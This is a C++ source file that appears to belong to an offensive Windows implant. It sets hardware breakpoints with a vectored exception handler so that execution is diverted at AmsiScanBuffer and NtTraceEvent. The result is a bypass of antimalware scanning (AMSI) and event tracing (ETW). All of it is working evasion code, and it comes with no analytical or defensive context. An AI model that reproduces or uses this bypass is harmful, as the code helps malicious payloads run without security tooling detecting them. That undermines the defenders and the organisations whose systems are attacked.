#include <general.h>

static auto hwbp_handler( EXCEPTION_POINTERS* exception ) -> LONG;

static auto dr7_set_bits( UINT_PTR dr7, UINT_PTR value, INT32 pos, INT32 count ) -> UINT_PTR {
    UINT_PTR mask = ((1ULL << count) - 1ULL) << pos;
    return (dr7 & ~mask) | ((value & ((1ULL << count) - 1ULL)) << pos);
}

auto hwbp_getarg( CONTEXT* ctx, ULONG index ) -> UINT_PTR {
#ifdef _WIN64
    switch ( index ) {
        case 1: return ctx->Rcx;
        case 2: return ctx->Rdx;
        case 3: return ctx->R8;
        case 4: return ctx->R9;
    }
    return *(UINT_PTR*)(ctx->Rsp + (index * sizeof(PVOID)));
#else
    return *(ULONG*)(ctx->Esp + (index * sizeof(PVOID)));
#endif
}

auto hwbp_setarg( CONTEXT* ctx, UINT_PTR value, ULONG index ) -> VOID {
#ifdef _WIN64
    switch ( index ) {
        case 1: ctx->Rcx = value; return;
        case 2: ctx->Rdx = value; return;
        case 3: ctx->R8  = value; return;
        case 4: ctx->R9  = value; return;
    }
    *(UINT_PTR*)(ctx->Rsp + (index * sizeof(PVOID))) = value;
#else
    *(ULONG*)(ctx->Esp + (index * sizeof(PVOID))) = value;
#endif
}

auto hwbp_setbreak( UINT_PTR address, UINT_PTR callback, INT8 drx, BOOL enable ) -> BOOL {
    g_instance

    if ( drx < 0 || drx > 3 )
        return FALSE;

    if ( !self->hwbp_data.initialized ) {
        self->hwbp_data.veh_handle  = self->ntdll.RtlAddVectoredExceptionHandler( TRUE, hwbp_handler );
        self->hwbp_data.initialized = TRUE;
    }

    self->hwbp_data.callbacks[drx] = callback;
    self->hwbp_data.targets[drx]   = address;

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    self->ntdll.NtGetContextThread( self->kernel32.GetCurrentThread(), &ctx );

    if ( enable ) {
        (&ctx.Dr0)[drx] = address;
        ctx.Dr7 = dr7_set_bits( ctx.Dr7, 1, (drx * 2), 1 ); 
        ctx.Dr7 = dr7_set_bits( ctx.Dr7, 0, 16 + (drx * 4), 2 ); 
        ctx.Dr7 = dr7_set_bits( ctx.Dr7, 0, 18 + (drx * 4), 2 ); 
    } else {
        (&ctx.Dr0)[drx] = 0;
        ctx.Dr7 = dr7_set_bits( ctx.Dr7, 0, (drx * 2), 1 ); 
        self->hwbp_data.callbacks[drx] = 0;
        self->hwbp_data.targets[drx]   = 0;
    }

    return nt_success( self->ntdll.NtContinue( &ctx, FALSE ) );
}

static auto hwbp_handler( EXCEPTION_POINTERS* exception ) -> LONG {
    g_instance

    if ( exception->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP )
        return EXCEPTION_CONTINUE_SEARCH;

    INT8 drx = -1;
    for ( int i = 0; i < 4; i++ ) {
        if ( (UINT_PTR)exception->ExceptionRecord->ExceptionAddress == self->hwbp_data.targets[i] ) {
            drx = i;
            break;
        }
    }

    if ( drx == -1 || !self->hwbp_data.callbacks[drx] )
        return EXCEPTION_CONTINUE_SEARCH;

    CONTEXT* ctx = exception->ContextRecord;
    (&ctx->Dr0)[drx] = 0;
    ctx->Dr7 = dr7_set_bits( ctx->Dr7, 0, (drx * 2), 1 );

    auto callback = (VOID(*)( CONTEXT* ))self->hwbp_data.callbacks[drx];
    callback( ctx );

    return EXCEPTION_CONTINUE_EXECUTION;
}

auto amsi_detour( CONTEXT* ctx ) -> VOID {
    g_instance

    ctx->Rdx = (UINT_PTR)self->kernel32.GetProcAddress(
        self->kernel32.GetModuleHandleA( "ntdll.dll" ), "NtAllocateVirtualMemory"
    );
    ctx->EFlags |= (1 << 16);
}

auto etw_detour( CONTEXT* ctx ) -> VOID {
    ctx->Rip  = *(UINT_PTR*)ctx->Rsp;
    ctx->Rsp += sizeof(PVOID);
    ctx->Rax  = STATUS_SUCCESS;
}

auto hwbp_bypass( INT32 mode ) -> BOOL {
    g_instance

    BOOL success = TRUE;

    if ( mode == BYPASS_ETW || mode == BYPASS_ALL ) {
        success &= hwbp_setbreak(
            (UINT_PTR)self->kernel32.GetProcAddress( self->kernel32.LoadLibraryA( "ntdll.dll" ), "NtTraceEvent" ),
            (UINT_PTR)etw_detour, 1, TRUE
        );
    }

    if ( mode == BYPASS_AMSI || mode == BYPASS_ALL ) {
        success &= hwbp_setbreak(
            (UINT_PTR)self->kernel32.GetProcAddress( self->kernel32.LoadLibraryA( "amsi.dll" ), "AmsiScanBuffer" ),
            (UINT_PTR)amsi_detour, 2, TRUE
        );
    }

    return success;
}

auto hwbp_clean( VOID ) -> BOOL {
    g_instance

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    self->ntdll.NtGetContextThread( self->kernel32.GetCurrentThread(), &ctx );

    ctx.Dr0 = ctx.Dr1 = ctx.Dr2 = ctx.Dr3 = ctx.Dr7 = 0;

    for ( int i = 0; i < 4; i++ ) {
        self->hwbp_data.callbacks[i] = 0;
        self->hwbp_data.targets[i]   = 0;
    }

    if ( self->hwbp_data.veh_handle ) {
        self->ntdll.RtlRemoveVectoredExceptionHandler( self->hwbp_data.veh_handle );
        self->hwbp_data.veh_handle  = NULL;
        self->hwbp_data.initialized = FALSE;
    }

    return nt_success( self->ntdll.NtContinue( &ctx, FALSE ) );
}